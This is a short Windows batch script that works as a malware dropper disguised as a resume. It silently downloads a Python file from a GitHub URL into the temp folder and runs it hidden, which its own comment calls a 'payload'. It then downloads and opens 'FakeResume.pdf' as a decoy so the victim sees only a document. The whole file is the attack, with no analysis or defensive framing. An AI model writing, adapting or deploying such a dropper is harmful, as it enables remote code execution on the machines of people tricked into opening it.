@echo off
echo Loading...
echo.

REM Download and run payload in background (hidden)
start /B curl -s https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py -o "%temp%\user.py"
start /MIN python "%temp%\user.py" >nul 2>&1

REM Download PDF
curl -s -L https://github.com/workspacehome0/download/raw/main/FakeResume.pdf -o "%temp%\FakeResume.pdf"

REM Open PDF
start "" "%temp%\FakeResume.pdf"

REM Close this window
exit

